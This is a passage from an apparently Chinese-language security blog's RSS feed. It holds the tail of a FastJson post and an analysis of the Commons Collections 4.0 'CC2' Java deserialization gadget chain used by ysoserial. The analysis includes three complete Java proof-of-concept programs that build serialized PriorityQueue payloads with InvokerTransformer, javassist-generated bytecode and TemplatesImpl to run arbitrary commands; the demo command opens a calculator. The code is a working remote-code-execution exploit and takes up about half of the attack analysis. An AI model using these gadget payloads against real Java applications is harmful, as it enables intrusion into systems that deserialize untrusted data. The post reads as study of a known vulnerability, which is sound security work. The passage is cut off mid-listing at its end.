class="hljs-selector-class">.wicket</span><span class="hljs-selector-class">.util</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.groovy</span><span class="hljs-selector-class">.runtime</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.hibernate</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.jboss</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.mozilla</span><span class="hljs-selector-class">.javascript</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.python</span><span class="hljs-selector-class">.core</span><br><span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><br></code></pre></td></tr></table></figure><h1 id="6-参考连接"><a href="#6-参考连接" class="headerlink" title="6.参考连接"></a>6.参考连接</h1><p><a href="https://www.freebuf.com/vuls/178012.html">https://www.freebuf.com/vuls/178012.html</a></p><p><a href="http://wjlshare.com/archives/1512">http://wjlshare.com/archives/1512</a></p><p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-CommonsCollections2分析</title>
    <link href="https://reader-l.github.io/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/</id>
    <published>2021-04-15T11:13:15.000Z</published>
    <updated>2021-05-17T06:21:22.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h1><p>​    该利用链需要先学习<code>javassist</code>以及<code>PriorityQueue</code>相关知识。</p><p>关于<code>javassist</code>我已经在<a href="https://reader-l.github.io/2020/10/05/java%E5%AE%89%E5%85%A8-javassist%E5%AD%A6%E4%B9%A0/">前面的文章</a>有写过相关语法了（虽然很垃圾）。</p><h2 id="1-PriorityQueue"><a href="#1-PriorityQueue" class="headerlink" title="1.PriorityQueue"></a>1.PriorityQueue</h2><p>相关构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue()           <br>使用默认的初始容量（<span class="hljs-number">11</span>）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。<br>PriorityQueue(<span class="hljs-keyword">int</span> initialCapacity)<br>使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。<br></code></pre></td></tr></table></figure><p>常见的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">add(E e)           将指定的元素插入此优先级队列<br>clear()            从此优先级队列中移除所有元素。<br>comparator()       返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 <span class="hljs-keyword">null</span><br>contains(Object o)          如果此队列包含指定的元素，则返回 <span class="hljs-keyword">true</span>。<br>iterator()           返回在此队列中的元素上进行迭代的迭代器。<br>offer(E e)           将指定的元素插入此优先级队列<br>peek()           获取但不移除此队列的头；如果此队列为空，则返回 <span class="hljs-keyword">null</span>。<br>poll()           获取并移除此队列的头，如果此队列为空，则返回 <span class="hljs-keyword">null</span>。<br>remove(Object o)           从此队列中移除指定元素的单个实例（如果存在）。<br>size()           返回此 collection 中的元素数。<br>toArray()          返回一个包含此队列所有元素的数组。<br></code></pre></td></tr></table></figure><h1 id="2-利用链限制条件"><a href="#2-利用链限制条件" class="headerlink" title="2.利用链限制条件"></a>2.利用链限制条件</h1><h4 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h4><p>CommonsCollections 4.0</p><h4 id="JDK限制"><a href="#JDK限制" class="headerlink" title="JDK限制"></a>JDK限制</h4><p>JDK版本：暂无限制</p><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p>​    我们先来看一下yso中的利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">PriorityQueue.readObject()</span><br><span class="hljs-comment">...</span><br><span class="hljs-comment">TransformingComparator.compare()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>我们可以看到如下为该利用链的核心：通过<code>TransformingComparator.compare()</code>方法调用<code>transform</code>方法从而触发<code>InvokerTransformer.transform()</code>来达到触发命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TransformingComparator.compare()<br>InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><p>我们跟进<code>TransformingComparator.compare()</code>看一下：发现在构造函数中会将我们传入的<code>transformer</code>（比如是<code>InvokerTransformer</code>）赋值给<code>this.transformer</code> 属性，同时发现在<code>compare</code>方法会调用我们传入的<code>transformer</code>的<code>transform</code>方法，假如<code>compare</code>方法的参数值是我们可以控制的话，那我们就可以执行任意命令了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/1.png"></p><p>​    所以接下来我们就要找到可以调用<code>TransformingComparator.compare()</code>，并且参数<code>obj1</code>和<code>obj2</code>参数可以控制的类。<code>yso</code>中，<code>cc2</code>中是用到了 <code>PriorityQueue</code>来进行触发的。</p><h2 id="1-通过PriorityQueue触发TransformingComparator-compare-分析。"><a href="#1-通过PriorityQueue触发TransformingComparator-compare-分析。" class="headerlink" title="1.通过PriorityQueue触发TransformingComparator.compare()分析。"></a>1.通过PriorityQueue触发TransformingComparator.compare()分析。</h2><p>​    我们先来看看<code>PriorityQueue.writeObject</code>序列化的方法：我们可以发现假如调用<code>PriorityQueue.writeObject</code>的话，程序序列化的数据是<code>queue</code>属性，我们可以可以利用反射机制来控制<code>queue</code>，所以这里<code>queue</code>可控</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/14.png"></p><p>​    那我们首先从<code>PriorityQueue.readObject</code>开始看起：反序列化的数据是我们可以控制的，因此<code>queue</code>对象数组的值是我们可以控制的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/2.png"></p><p>​        跟进<code>heapify()</code>方法看一下：可以发现调用了<code>siftDown</code>方法处理了我们反序列化的数据<code>queue</code>。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/3.png"></p><p>​    跟进<code>sfitDown</code>方法看看：</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/4.png"></p><p>​    继续跟进<code>siftDownUsingComparator</code>方法进行查看：我们可以发现调用了<code>compare()</code>方法，同时它的相关参数我们都是可以控制的。这就是作者选择<code>PriorityQueue</code>的原因。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/5.png"></p><h2 id="2-部分完善利用链并写一个demo"><a href="#2-部分完善利用链并写一个demo" class="headerlink" title="2.部分完善利用链并写一个demo"></a>2.部分完善利用链并写一个demo</h2><p>我将yso中的利用链进行补全：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/*<br>Gadget chain:<br>ObjectInputStream.readObject()<br>PriorityQueue.readObject()<br>PriorityQueue.heapify()<br>                    PriorityQueue.siftDown()<br>                        PriorityQueue.siftDownUsingComparator()<br>                            TransformingComparator<span class="hljs-built_in">.compare</span>()<br>                                InvokerTransformer<span class="hljs-built_in">.transform</span>()<br>                                        Method.invoke()<br>                                            Runtime.exec()<br> */<br></code></pre></td></tr></table></figure><p>根据以前写的命令执行的利用demo修改一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(priorityQueue,transformingComparator);<br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./eviltest.bin&quot;</span>));<br>            outputStream.writeObject(priorityQueue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./eviltest.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功执行系统命令弹出计算器。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/6.png"></p><p>​    这时候师傅们有可能会有一个小疑惑：为啥需要向优先级队列添加两个元素呢？</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/7.png"></p><p>这是因为只添加一个元素的话，最终结果会为-1从而无法进入<code>siftDown</code>方法的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/8.png"></p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/9.png"></p><h2 id="3-进一步完善YSO利用链并写一个Demo"><a href="#3-进一步完善YSO利用链并写一个Demo" class="headerlink" title="3.进一步完善YSO利用链并写一个Demo"></a>3.进一步完善YSO利用链并写一个Demo</h2><p>​    以上我们写的poc虽然可以执行系统命令，但是yso的作者并不是使用该方法。cc2利用链中是利用<code>javasist </code>和 <code>TemplatesImpl</code>，利用字节码来进行执行代码的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/11.png"></p><p>​    我们也尝试使用<code>javasist </code>和 <code>TemplatesImpl</code>这两种技术来构造POC。</p><p>​    我们可以尝试先用<code>javasist</code>生成恶意的恶意字节码，调用<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令。</p><p>​    如下POC是利用<code>javasist</code>生成恶意字节码后，用<code>TemplatesImpl</code>加载该字节码执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">javasistEvil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/12.png"></p><p>​    为了更好的符合实战利用中的要求。可以利用<code>InvokerTransformer</code>触发<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">javasistEvil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        Class clazzs = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);<br>        Constructor constructor = clazzs.getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">null</span>);<span class="hljs-comment">//这里和之前利用TemplatesImpl加载恶意字节码有点不同，我下面文章分析</span><br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Class clazz2 = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field queues =  clazz2.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queues.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;obj,<span class="hljs-number">1</span>&#125;;<br>        queues.set(priorityQueue,queue_array);<br><br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(priorityQueue,transformingComparator);<br>        <span class="hljs-comment">//obj.newTransformer();</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./eviltest1.bin&quot;</span>));<br>            outputStream.writeObject(priorityQueue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./eviltest1.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/13.png"></p><p>完善的利用链：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                                <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                    <span class="hljs-module-access"><span 